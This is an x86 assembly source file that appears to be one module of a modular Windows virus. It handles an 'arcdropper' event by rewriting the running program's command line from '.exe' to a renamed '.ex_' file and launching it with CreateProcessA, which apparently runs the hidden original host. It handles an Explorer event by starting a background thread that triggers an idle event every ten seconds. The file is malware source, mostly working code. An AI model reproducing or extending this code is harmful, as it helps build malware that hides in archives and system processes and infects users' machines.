
include                 MAIN.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\PLAN\plan.inc
include                 ..\RARZIP\rarzip.inc

                        extrn   Event:PROC

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

_startinfo              db      40h,0,0,0, 40h dup (0)
_procinfo               db      16h dup (0)
_cmdline                db      512 dup (?)

tid                     dd      ?
thandle                 dd      ?

                        .code


HandleEvent:            cmp     dword ptr [esp+4], EV_PLAN_PER_PROCESS
                        jne     return_0
                        cmp     dword ptr [esp+8], PLAN_ARCDROPPER
                        je      arcdropper
                        cmp     dword ptr [esp+8], PLAN_EXPLORER
                        je      main

return_0:               xor     eax, eax
                        retn

; ---------------------------------------------------------------------------

arcdropper:             pusha

                        callW   GetCommandLineA

                        xchg    esi, eax
                        lea     edi, _cmdline
                        cld
                        xor     ecx, ecx                ; #
__cpy:                  lodsb
                        stosb
                        mov     ebx, [edi-5]            ; .exe
                        or      ebx, 20202000h
                        cmp     ebx, 'exe.'
                        jne     __cnt
                        mov     dword ptr [edi-5], EXT_NEW ; .ex_
                        inc     ecx                     ; #
__cnt:                  or      al, al
                        jnz     __cpy
                        dec     ecx                     ; #
                        jnz     __exit

                        push    offset _procinfo
                        push    offset _startinfo ; startupinfo
                        push    0               ; curdir
                        push    0               ; env
                        push    0               ; flags
                        push    1               ; inherithandles
                        push    0               ; process_attr
                        push    0               ; thread_attr
                        push    offset _cmdline ; cmdline
                        push    0               ; application
                        callW   CreateProcessA

__exit:                 popa

                        mov     eax, 0
                        retn

; ---------------------------------------------------------------------------

main:                   push    offset tid      ; ptr to tid
                        push    0
                        push    0               ; thread parameter
                        push    offset main_thread
                        push    128*1024        ; stack
                        push    0
                        callW   CreateThread
                        mov     thandle, eax
                        or      eax, eax
                        jz      return_0

                        mov     eax, 1
                        retn

; ---------------------------------------------------------------------------

main_thread:

__cycle:                push    10*1000             ; 10 sec
                        callW   Sleep

                        push    0
                        push    EV_MAIN_IDLE
                        call    Event
                        add     esp, 8

                        jmp     __cycle

; ---------------------------------------------------------------------------

                        end
